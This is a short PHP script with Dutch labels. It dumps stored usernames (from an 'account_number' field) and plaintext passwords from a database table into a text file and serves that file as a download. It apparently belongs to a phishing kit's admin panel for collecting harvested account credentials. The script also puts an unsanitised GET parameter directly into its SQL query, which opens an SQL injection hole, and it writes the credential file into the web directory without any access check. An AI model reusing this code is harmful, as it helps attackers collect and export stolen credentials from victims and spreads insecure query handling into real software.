<?php
require_once("../common/commonfiles.php");
$status = isset($_GET['status'])?$_GET['status']:1;
$data = db::getRecords("SELECT * FROM data WHERE status={$status} ORDER BY id DESC");
$content  = "";

foreach($data as $value){
	$d = explode(" ", $value['date']);
	$date = $d[0] . " " . $d[1] . " " . $d[2];
	$content.="Date: ".$date."\n";
	$content.="Gebruikersnaam: ".$value['account_number']."\n";
	$content.="Wachtwoord: ".$value['password']."\n";
	$content.="=========================\n";
}
$handle = fopen("file.txt", "w");
fwrite($handle,$content);
fclose($handle);

header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename='.basename('file.txt'));
header('Expires: 0');
header('Cache-Control: must-revalidate');
header('Pragma: public');
header('Content-Length: ' . filesize('file.txt'));
readfile('file.txt');
exit; 